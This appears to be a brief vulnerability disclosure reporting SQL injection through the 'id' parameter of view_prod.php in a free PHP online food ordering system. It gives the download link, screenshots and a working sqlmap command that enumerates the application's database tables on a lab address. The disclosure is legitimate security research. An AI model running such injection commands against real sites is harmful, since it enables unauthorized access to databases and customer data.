vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212480634-0006643c-8493-473a-8738-5008b1535280.png)
sqlmap.py -u "http://192.168.249.88/php-fos-db/view_prod.php?id=1" -D fos_db --tables
![image](https://user-images.githubusercontent.com/30823782/212480674-5377473b-6732-4477-acd1-964339ae9f83.png)
